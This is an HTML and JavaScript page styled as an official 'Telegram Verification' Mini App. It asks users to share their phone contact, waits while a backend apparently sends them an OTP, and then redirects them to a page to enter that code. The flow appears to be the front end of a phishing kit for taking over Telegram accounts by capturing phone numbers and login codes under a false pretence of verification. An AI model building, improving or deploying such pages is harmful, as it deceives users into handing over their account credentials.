<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: #0088cc; color: white; padding: 24px 20px; text-align: center; }
        .content { padding: 30px; }
        .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }
        .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
        .error.show { display: block; }
        .success { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
        .success.show { display: block; }
        .hidden { display: none; }
        .info-box { background: #f5f5f5; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-size: 14px; }
        .loading { text-align: center; padding: 30px 20px; }
        .loading-spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>üîê Telegram Verification</h2>
            <p>Verify your account</p>
        </div>
        
        <div class="content">
            <!-- Initial Screen -->
            <div id="initial-screen">
                <div class="info-box">
                    <b>Steps:</b><br>
                    1. Click "Share Contact"<br>
                    2. Allow contact sharing<br>
                    3. OTP will be sent<br>
                    4. Enter OTP
                </div>
                
                <div class="error" id="error-message"></div>
                <div class="success" id="success-message"></div>
                
                <button class="btn" onclick="shareContact()" id="share-btn">
                    üìû Share My Contact
                </button>
            </div>
            
            <!-- Contact Shared Screen -->
            <div id="contact-screen" class="hidden">
                <div class="info-box">
                    ‚úÖ <b>Contact shared!</b><br>
                    Processing...
                </div>
                
                <div class="loading">
                    <div class="loading-spinner"></div>
                    <p id="waiting-text">Waiting for OTP...</p>
                </div>
                
                <div class="error" id="contact-error"></div>
            </div>
            
            <!-- OTP Sent Screen -->
            <div id="otp-screen" class="hidden">
                <div class="success show">
                    ‚úÖ <b>OTP Sent!</b>
                </div>
                
                <div class="info-box" id="phone-display">
                    Phone: Loading...
                </div>
                
                <button class="btn" onclick="goToOTPPage()">
                    üî¢ Enter OTP Now
                </button>
            </div>
        </div>
    </div>

    <script>
        let userId = null;
        let checkInterval = null;
        
        // Initialize Telegram WebApp
        document.addEventListener('DOMContentLoaded', function() {
            console.log("WebApp loaded");
            
            // Initialize session with backend
            initUserSession();
        });
        
        function initUserSession() {
            // Get user ID from Telegram WebApp
            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                Telegram.WebApp.ready();
                Telegram.WebApp.expand();
                
                const user = Telegram.WebApp.initDataUnsafe?.user;
                if (user && user.id) {
                    userId = user.id.toString();
                    console.log("User ID from WebApp:", userId);
                } else {
                    // Fallback: use query parameter or generate
                    const urlParams = new URLSearchParams(window.location.search);
                    userId = urlParams.get('user_id') || 'web_' + Date.now();
                    console.log("Generated user ID:", userId);
                }
            } else {
                // For testing outside Telegram
                const urlParams = new URLSearchParams(window.location.search);
                userId = urlParams.get('user_id') || 'test_' + Date.now();
                console.log("Test user ID:", userId);
            }
            
            // Initialize session with backend
            if (userId) {
                fetch('/api/init-session', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: userId
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        console.log("Session initialized:", data.message);
                    } else {
                        console.error("Failed to initialize session:", data.error);
                    }
                })
                .catch(error => {
                    console.error("Session init error:", error);
                });
            }
        }
        
        function shareContact() {
            console.log("Share contact clicked for user:", userId);
            
            if (!userId) {
                showError("Cannot get user ID");
                return;
            }
            
            // Show contact screen
            document.getElementById('initial-screen').classList.add('hidden');
            document.getElementById('contact-screen').classList.remove('hidden');
            
            // Check if we're in Telegram WebApp
            if (typeof Telegram !== 'undefined' && Telegram.WebApp && Telegram.WebApp.requestContact) {
                Telegram.WebApp.requestContact(function(shared) {
                    console.log("requestContact callback:", shared);
                    
                    if (shared) {
                        console.log("‚úÖ User shared contact");
                        startCheckingOTPStatus();
                    } else {
                        console.log("‚ùå User cancelled");
                        document.getElementById('contact-screen').classList.add('hidden');
                        document.getElementById('initial-screen').classList.remove('hidden');
                        showError("Contact sharing cancelled");
                    }
                });
            } else {
                // For testing
                console.log("‚ö†Ô∏è Using test mode");
                startCheckingOTPStatus();
            }
        }
        
        function startCheckingOTPStatus() {
            console.log("Starting OTP status check for user:", userId);
            
            if (checkInterval) {
                clearInterval(checkInterval);
            }
            
            let attempts = 0;
            const maxAttempts = 60; // 60 seconds timeout
            
            checkInterval = setInterval(() => {
                checkOTPStatus();
                attempts++;
                
                if (attempts >= maxAttempts) {
                    clearInterval(checkInterval);
                    showError("Timeout: OTP not sent. Please try again.");
                    document.getElementById('contact-screen').classList.add('hidden');
                    document.getElementById('initial-screen').classList.remove('hidden');
                }
            }, 1000);
            
            // Check immediately
            checkOTPStatus();
        }
        
        function checkOTPStatus() {
            if (!userId) return;
            
            console.log("Checking OTP status...");
            
            fetch(`/api/check-otp-sent/${userId}`)
                .then(response => response.json())
                .then(data => {
                    console.log("OTP check response:", data);
                    
                    if (data.success) {
                        if (data.otp_sent) {
                            // OTP sent successfully
                            clearInterval(checkInterval);
                            document.getElementById('contact-screen').classList.add('hidden');
                            document.getElementById('otp-screen').classList.remove('hidden');
                            document.getElementById('phone-display').textContent = `Phone: ${data.phone}`;
                            
                            // Auto-redirect after 2 seconds
                            setTimeout(() => {
                                goToOTPPage();
                            }, 2000);
                        } else if (data.contact_received) {
                            // Contact received but OTP not sent yet
                            document.getElementById('waiting-text').textContent = 
                                `Contact received, sending OTP...`;
                        } else {
                            // Still waiting for contact
                            document.getElementById('waiting-text').textContent = 
                                `Waiting for contact... (${Math.floor(Date.now() / 1000) % 10})`;
                        }
                    } else {
                        // Error
                        clearInterval(checkInterval);
                        showError(data.error || "Failed to process contact");
                        document.getElementById('contact-screen').classList.add('hidden');
                        document.getElementById('initial-screen').classList.remove('hidden');
                    }
                })
                .catch(error => {
                    console.error("Check status error:", error);
                });
        }
        
        function goToOTPPage() {
            console.log("Redirecting to OTP page for user:", userId);
            window.location.href = `/otp?user_id=${userId}`;
        }
        
        function showError(message) {
            console.error("Error:", message);
            const errorEl = document.getElementById('error-message');
            errorEl.textContent = message;
            errorEl.classList.add('show');
            
            setTimeout(() => {
                errorEl.classList.remove('show');
            }, 5000);
        }
    </script>
</body>
</html>
